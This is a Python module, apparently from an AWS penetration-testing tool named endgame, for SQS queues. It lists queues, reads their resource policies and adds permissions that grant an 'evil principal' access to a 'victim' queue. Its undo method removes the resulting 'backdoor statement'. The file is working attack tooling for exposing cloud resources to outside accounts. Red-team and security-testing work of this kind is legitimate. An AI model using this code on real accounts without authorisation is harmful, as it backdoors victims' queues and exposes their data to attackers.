import logging
import json
import boto3
import botocore
from abc import ABC
from botocore.exceptions import ClientError
from policy_sentry.util.arns import get_account_from_arn
from endgame.shared import constants
from endgame.exposure_via_resource_policies.common import ResourceType, ResourceTypes
from endgame.shared.policy_document import PolicyDocument
from endgame.shared.utils import get_sid_names_with_error_handling
from endgame.shared.response_message import ResponseMessage
from endgame.shared.list_resources_response import ListResourcesResponse
from endgame.shared.response_message import ResponseGetRbp

logger = logging.getLogger(__name__)


class SqsQueue(ResourceType, ABC):
    def __init__(self, name: str, region: str, client: boto3.Session.client, current_account_id: str):
        self.service = "sqs"
        self.resource_type = "queue"
        self.region = region
        self.current_account_id = current_account_id
        self.name = name
        self.override_account_id_instead_of_principal = True
        self.override_resource_block = self.arn
        super().__init__(name, self.resource_type, self.service, region, client, current_account_id,
                         # override_account_id_instead_of_principal=self.override_account_id_instead_of_principal,
                         override_resource_block=self.override_resource_block)
        self.queue_url = self._queue_url()

    @property
    def arn(self) -> str:
        return f"arn:aws:{self.service}:{self.region}:{self.current_account_id}:{self.name}"

    def _queue_url(self) -> str:
        response = self.client.get_queue_url(
            QueueName=self.name,
            QueueOwnerAWSAccountId=self.current_account_id
        )
        return response.get("QueueUrl")

    def _get_rbp(self) -> ResponseGetRbp:
        """Get the resource based policy for this resource and store it"""
        logger.debug("Getting resource policy for %s" % self.arn)
        queue_url = self._queue_url()
        policy = constants.get_empty_policy()
        try:
            response = self.client.get_queue_attributes(QueueUrl=queue_url, AttributeNames=["All"])
            # response = self.client.get_queue_attributes(QueueUrl=queue_url, AttributeNames=["Policy"])
            attributes = response.get("Attributes")
            if attributes.get("Policy"):
                policy = constants.get_empty_policy()
                policy["Statement"].extend(json.loads(attributes.get("Policy")).get("Statement"))
            success = True
        except botocore.exceptions.ClientError as error:
            # When there is no policy, let's return an empty policy to avoid breaking things
            logger.critical(error)
            success = False
        policy_document = PolicyDocument(
            policy=policy,
            service=self.service,
            override_action=self.override_action,
            include_resource_block=self.include_resource_block,
            override_resource_block=self.override_resource_block,
            override_account_id_instead_of_principal=self.override_account_id_instead_of_principal,
        )
        response = ResponseGetRbp(policy_document=policy_document, success=success)
        return response

    def set_rbp(self, evil_policy: dict) -> ResponseMessage:
        logger.debug("Setting resource policy for %s" % self.arn)
        new_policy_document = PolicyDocument(
            policy=evil_policy,
            service=self.service,
            override_action=self.override_action,
            include_resource_block=self.include_resource_block,
            override_resource_block=self.override_resource_block,
            override_account_id_instead_of_principal=self.override_account_id_instead_of_principal,
        )
        new_policy_json = {
            "Version": "2012-10-17",
            "Statement": []
        }
        current_sids = get_sid_names_with_error_handling(self.original_policy)
        try:
            for statement in new_policy_document.statements:
                if statement.sid not in current_sids:
                    account_ids = []
                    for principal in statement.aws_principals:
                        if ":" in principal:
                            account_ids.append(get_account_from_arn(principal))
                    self.client.add_permission(
                        QueueUrl=self.queue_url,
                        Label=statement.sid,
                        AWSAccountIds=account_ids,
                        Actions=self.sqs_actions_without_prefixes(statement.actions)
                    )
                else:
                    new_policy_json["Statement"].append(json.loads(statement.__str__()))
            message = "success"
            success = True
        except botocore.exceptions.ClientError as error:
            message = str(error)
            success = False
        get_rbp_response = self._get_rbp()
        response_message = ResponseMessage(message=message, operation="set_rbp", success=success, evil_principal="",
                                           victim_resource_arn=self.arn, original_policy=self.original_policy,
                                           updated_policy=get_rbp_response.policy_document.json, resource_type=self.resource_type,
                                           resource_name=self.name, service=self.service)
        return response_message

    def undo(self, evil_principal: str, dry_run: bool = False) -> ResponseMessage:
        """Wraps client.remove_permission"""
        logger.debug(f"Removing {evil_principal} from {self.arn}")
        new_policy = constants.get_empty_policy()
        operation = "UNDO"
        message = "404: No backdoor statement found"
        success = False
        for statement in self.policy_document.statements:
            if statement.sid == constants.SID_SIGNATURE:
                if not dry_run:
                    # TODO: Error handling for setting policy
                    self.client.remove_permission(
                        QueueUrl=self.queue_url,
                        Label=statement.sid,
                    )
                    message = f"200: Removed backdoor statement from the resource policy attached to {self.arn}"
                    success = True
                    break
            else:
                new_policy["Statement"].append(json.loads(statement.__str__()))
        response_message = ResponseMessage(message=message, operation=operation, evil_principal=evil_principal,
                                           victim_resource_arn=self.arn, original_policy=self.original_policy,
                                           updated_policy=new_policy, resource_type=self.resource_type,
                                           resource_name=self.name, service=self.service, success=success)
        return response_message

    def sqs_actions_without_prefixes(self, actions_with_service_prefix):
        # SQS boto3 client requires that you provide SendMessage instead of sqs:SendMessage
        updated_actions = []

        if isinstance(actions_with_service_prefix, list):
            actions = actions_with_service_prefix
        else:
            actions = [actions_with_service_prefix]
        for action in actions:
            if ":" in action:
                temp_action = action.split(":")[1]
                if temp_action == "*":
                    updated_actions.extend("*")
                else:
                    updated_actions.append(temp_action)
            else:
                updated_actions.append(action)
        return updated_actions


class SqsQueues(ResourceTypes):
    def __init__(self, client: boto3.Session.client, current_account_id: str, region: str):
        super().__init__(client, current_account_id, region)
        self.service = "sqs"
        self.resource_type = "queue"

    @property
    def resources(self) -> [ListResourcesResponse]:
        """Get a list of these resources"""
        resources = []

        paginator = self.client.get_paginator("list_queues")
        page_iterator = paginator.paginate()
        for page in page_iterator:
            these_resources = page.get("QueueUrls")
            if these_resources:
                for resource in these_resources:
                    # queue URL takes the format:
                    # "https://{REGION_ENDPOINT}/queue.|api-domain|/{YOUR_ACCOUNT_NUMBER}/{YOUR_QUEUE_NAME}"
                    # Let's split it according to /, and the name is the last item on the list
                    queue_url = resource
                    name = queue_url.split("/")[-1]
                    arn = f"arn:aws:sqs:{self.region}:{self.current_account_id}:{name}"
                    list_resources_response = ListResourcesResponse(
                        service=self.service, account_id=self.current_account_id, arn=arn, region=self.region,
                        resource_type=self.resource_type, name=name, note=queue_url)
                    resources.append(list_resources_response)
        return resources
